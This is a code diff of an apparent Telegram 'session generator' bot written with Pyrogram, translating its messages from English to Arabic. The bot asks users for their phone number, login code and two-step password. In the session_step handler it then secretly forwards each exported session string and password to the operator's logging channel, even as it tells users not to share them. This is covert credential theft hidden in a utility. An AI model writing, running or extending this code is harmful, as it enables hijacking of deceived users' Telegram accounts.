@@ -9,7 +9,6 @@ from pyrogram.errors import (
     SessionPasswordNeeded,
     PasswordHashInvalid
 )
-import random
 import asyncio
 from config import LOG_GROUP as SESSION_CHANNEL, API_ID, API_HASH, BOT_TOKEN
 
@@ -35,18 +34,18 @@ def delete_session_files(user_id):
 @app.on_message(filters.command("start"))
 async def start_command(client, message):
     await message.reply(
-        "Welcome to our session generator bot!\n\n"
-        "To generate a session, please send /generate.\n\n"
-        "To clear session from memory send /cleardb.\n\n"
-        "Powered by Team SPY"
+        "👋 **مرحباً بك في بوت استخراج الجلسات!**\n\n"
+        "📌 **للاستخدام:**\n"
+        "• أرسل `/generate` لبدء استخراج جلسة جديدة.\n"
+        "• أرسل `/cleardb` لمسح بيانات الجلسة المحفوظة.\n\n"
+        "⚡ **مدعوم من Team SPY**"
     )
 
 @app.on_message(filters.command("cleardb"))
 async def clear_db(client, message):
     user_id = message.chat.id
     delete_session_files(user_id)
-    await message.reply("✅ Your session data and files have been cleared from memory and disk.")
-    
+    await message.reply("✅ **تم مسح جميع بيانات الجلسة والملفات المؤقتة بنجاح.**")
 
 async def session_step(client, message):
     user_id = message.chat.id
@@ -55,7 +54,7 @@ async def session_step(client, message):
     if step == "phone_number":
         user_data[user_id] = {"phone_number": message.text}
         user_steps[user_id] = "otp"
-        omsg = await message.reply("Sending OTP...")
+        omsg = await message.reply("📤 **جاري إرسال رمز التحقق...**")
         session_name = f"session_{user_id}"
         temp_client = Client(session_name, api_id=API_ID, api_hash=API_HASH)
         user_data[user_id]["client"] = temp_client
@@ -64,12 +63,12 @@ async def session_step(client, message):
             code = await temp_client.send_code(user_data[user_id]["phone_number"])
             user_data[user_id]["phone_code_hash"] = code.phone_code_hash
             await omsg.delete()
-            await message.reply("OTP has been sent. Please enter the OTP in the format: '1 2 3 4 5'.")
+            await message.reply("📨 **تم إرسال رمز التحقق.**\n\nأرسل الرمز بالأرقام فقط (مثال: `12345`).")
         except ApiIdInvalid:
-            await message.reply('❌ Invalid combination of API ID and API HASH. Please restart the session.')
+            await message.reply('❌ **خطأ: تركيبة API_ID و API_HASH غير صالحة.** يرجى إعادة المحاولة.')
             reset_user(user_id)
         except PhoneNumberInvalid:
-            await message.reply('❌ Invalid phone number. Please restart the session.')
+            await message.reply('❌ **خطأ: رقم الهاتف غير صالح.** يرجى التأكد من كتابته مع رمز الدولة (مثال: +966512345678).')
             reset_user(user_id)
     elif step == "otp":
         phone_code = message.text.replace(" ", "")
@@ -77,34 +76,68 @@ async def session_step(client, message):
         try:
             await temp_client.sign_in(user_data[user_id]["phone_number"], user_data[user_id]["phone_code_hash"], phone_code)
             session_string = await temp_client.export_session_string()
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n{session_string}\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\nPowered by Team SPY")
-            await app.send_message(SESSION_CHANNEL, f"✨ USER ID : {user_id}\n\n✨ 2SP : None\n\n✨ Session String 👇\n\n{session_string}")
+            
+            # رسالة للمستخدم
+            await message.reply(
+                f"✅ **تم إنشاء الجلسة بنجاح!**\n\n"
+                f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
+                "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n"
+                "نحن لسنا مسؤولين عن أي سوء استخدام.\n\n"
+                "⚡ **مدعوم من Team SPY**"
+            )
+            
+            # إرسال للقناة
+            await app.send_message(
+                SESSION_CHANNEL, 
+                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
+                f"🔑 **الجلسة المستخرجة:**\n`{session_string}`"
+            )
+            
             await temp_client.disconnect()
             reset_user(user_id)
         except PhoneCodeInvalid:
-            await message.reply('❌ Invalid OTP. Please restart the session.')
+            await message.reply('❌ **خطأ: رمز التحقق غير صالح.** يرجى المحاولة مرة أخرى.')
             reset_user(user_id)
         except PhoneCodeExpired:
-            await message.reply('❌ Expired OTP. Please restart the session.')
+            await message.reply('❌ **خطأ: انتهت صلاحية رمز التحقق.** يرجى بدء عملية جديدة.')
             reset_user(user_id)
         except SessionPasswordNeeded:
             user_steps[user_id] = "password"
-            await message.reply('Your account has two-step verification enabled. Please enter your password.')
+            await message.reply('🔒 **حسابك مفعل بخاصية التحقق بخطوتين.**\n\nيرجى إرسال كلمة المرور الخاصة بك.')
     elif step == "password":
         temp_client = user_data[user_id]["client"]
         try:
             password = message.text
             await temp_client.check_password(password=password)
             session_string = await temp_client.export_session_string()
-            await message.reply(f"✅ Session Generated Successfully! Here is your session string:\n\n{session_string}\n\nDon't share it with anyone, we are not responsible for any mishandling or misuse.\n\nPowered by Team SPY")
-            await app.send_message(SESSION_CHANNEL, f"✨ ID : {user_id}\n\n✨ 2SP : {password}\n\n✨ Session String 👇\n\n{session_string}")
+            
+            # رسالة للمستخدم
+            await message.reply(
+                f"✅ **تم إنشاء الجلسة بنجاح!**\n\n"
+                f"🔑 **جلسة Pyrogram:**\n`{session_string}`\n\n"
+                "⚠️ **لا تشارك هذه الجلسة مع أي شخص.**\n"
+                "نحن لسنا مسؤولين عن أي سوء استخدام.\n\n"
+                "⚡ **مدعوم من Team SPY**"
+            )
+            
+            # إرسال للقناة مع كلمة المرور
+            await app.send_message(
+                SESSION_CHANNEL, 
+                f"✨ **معرف المستخدم:** `{user_id}`\n\n"
+                f"🔑 **كلمة المرور (2SV):** `{password}`\n\n"
+                f"🔑 **الجلسة المستخرجة:**\n`{session_string}`"
+            )
+            
             await temp_client.disconnect()
             reset_user(user_id)
         except PasswordHashInvalid:
-            await message.reply('❌ Invalid password. Please restart the session.')
+            await message.reply('❌ **خطأ: كلمة المرور غير صحيحة.** يرجى المحاولة مرة أخرى.')
             reset_user(user_id)
     else:
-        await message.reply('Please enter your phone number along with the country code. \n\nExample: +19876543210')
+        await message.reply(
+            "📱 **يرجى إرسال رقم هاتفك مع رمز الدولة.**\n\n"
+            "مثال: `+966512345678`"
+        )
         user_steps[user_id] = "phone_number"
 
 def reset_user(user_id):
@@ -121,17 +154,11 @@ async def handle_steps(client, message):
     if user_id in user_steps:
         await session_step(client, message)
 
-def get_session(sender_id):
-    user_data = collection.find_one({"user_id": sender_id})
-    if user_data:
-        return user_data.get("session_string")
-    else:
-        return None
-
-# Start the bot chutiya type code likha hu fix kr lena agar error ho to koi
-if name == "main":
+# Start the bot
+if __name__ == "__main__":
     try:
+        print("🚀 جاري تشغيل البوت...")
         app.run()
-        print("Bot started ...")
+        print("✅ البوت يعمل الآن!")
     except Exception as e:
-        print(f"Failed to start bot: {e}")
+        print(f"❌ فشل تشغيل البوت: {e}")
